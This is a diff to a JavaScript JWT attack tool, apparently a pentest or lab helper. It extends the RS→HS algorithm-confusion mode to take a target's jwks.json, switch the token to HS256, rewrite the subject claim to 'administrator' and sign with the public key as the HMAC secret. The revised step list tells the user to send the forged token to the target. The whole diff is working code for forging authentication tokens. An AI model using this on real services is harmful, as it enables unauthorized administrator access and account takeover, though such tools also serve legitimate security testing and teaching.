@@ -86,18 +86,19 @@ async function generateJwkAttackToken(forceJwkSign) {
     }
 
 
-    if (selectedAttack === 'algorithm-confusion') {
+  if (selectedAttack === 'algorithm-confusion') {
       const mode = confusionMode.value;
       if (mode === 'rs_hs') {
-        const keyInput = requireInput('Provide server public key/JWKS input for RS->HS mode.');
+        const keyInput = requireInput('Provide full jwks.json content for RS->HS mode.');
         const keyBytes = await parseAlgorithmConfusionKey(keyInput);
         nextHeader.alg = 'HS256';
         delete nextHeader.jwk;
         delete nextHeader.jku;
+        if (typeof payload.sub === 'string') payload.sub = 'administrator';
         const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
         nextSig = await hmacSignBase64urlBytes(signingInput, keyBytes, 'SHA-256');
         resultToken.value = `${signingInput}.${nextSig}`;
-        attackNotes.textContent = 'Algorithm confusion RS→HS token generated and signed.';
+        attackNotes.textContent = 'Algorithm confusion RS→HS token generated and signed. Parsed key from provided jwks.json and switched sub=administrator.';
         return;
       }
 
@@ -223,7 +224,7 @@ function configureInputForAttack(key) {
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
 
   if (key === 'algorithm-confusion') {
-    showInput('Key input', '{"keys":[{...RSA JWK...}]}', 'Provide key material according to selected mode.');
+    showInput('Key input', '{"keys":[{"kty":"RSA","n":"...","e":"AQAB"}]}', 'RS→HS: paste full jwks.json content. HS→RS: optional private key (PEM/JWK) for signing.');
     confusionTools.classList.remove('hidden');
     updateConfusionInputHint();
     return;
@@ -314,10 +315,11 @@ function getAttackSteps(key) {
   if (key === 'algorithm-confusion') {
     return [
       '1) Choose confusion mode (RS→HS or HS→RS).',
-      '2) Provide key material in Attack-specific input according to mode.',
-      '3) Edit payload claims as needed.',
-      '4) Click Generate to build and sign token automatically.',
-      '5) Send request with generated token and validate behavior.',
+      '2) RS→HS mode: paste full /jwks.json response into Attack-specific input.',
+      '3) Tool auto-switches alg to HS256, updates sub to administrator, and signs with public-key material as HMAC secret.',
+      '4) HS→RS mode: optionally paste RSA private key (PEM/JWK) or let tool auto-generate key.',
+      '5) Click Generate to build and sign token automatically.',
+      '6) Send request with generated token and validate behavior.',
     ].join('\n');
   }
 
@@ -513,8 +515,8 @@ function updateConfusionInputHint() {
   if (confusionMode.value === 'rs_hs') {
     extraInputLabel.textContent = 'RS→HS key input';
     extraInput.placeholder = '{"keys":[{...RSA JWK...}]}';
-    extraInputHelp.textContent = 'Paste server JWKS/JWK, Base64 PEM, or raw PEM public key.';
-    confusionHelp.textContent = 'RS→HS uses server public key material as HS256 secret.';
+    extraInputHelp.textContent = 'Paste full jwks.json content from target (including the outer {"keys":[...]} object).';
+    confusionHelp.textContent = 'RS→HS uses the RSA public key from jwks.json as HS256 secret and auto-sets sub=administrator.';
   } else {
     extraInputLabel.textContent = 'HS→RS private key input (optional)';
     extraInput.placeholder = 'Private JWK JSON or PEM private key';
